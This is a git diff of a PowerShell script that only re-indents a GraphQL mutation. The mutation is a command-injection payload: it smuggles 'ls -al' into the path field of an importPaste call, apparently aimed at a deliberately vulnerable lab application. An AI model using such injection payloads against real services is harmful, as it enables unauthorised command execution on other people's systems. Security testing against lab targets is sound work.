@@ -184,11 +184,11 @@ Invoke-GraphQLQuery -Mutation $requestForgeryMutation -Uri $gqlEndpointUri -Raw
 $commandToInject = "ls -al"
 
 $commandInjectionMutation = '
-mutation  {
-      importPaste(host:"localhost", port:80, path:"/ ; ' + $commandToInject + '", scheme:"http"){
-        result
-      }
+  mutation  {
+    importPaste(host:"localhost", port:80, path:"/ ; ' + $commandToInject + '", scheme:"http"){
+      result
     }
+  }
 '
 
 $response = Invoke-GraphQLQuery -Mutation $commandInjectionMutation -Uri $gqlEndpointUri
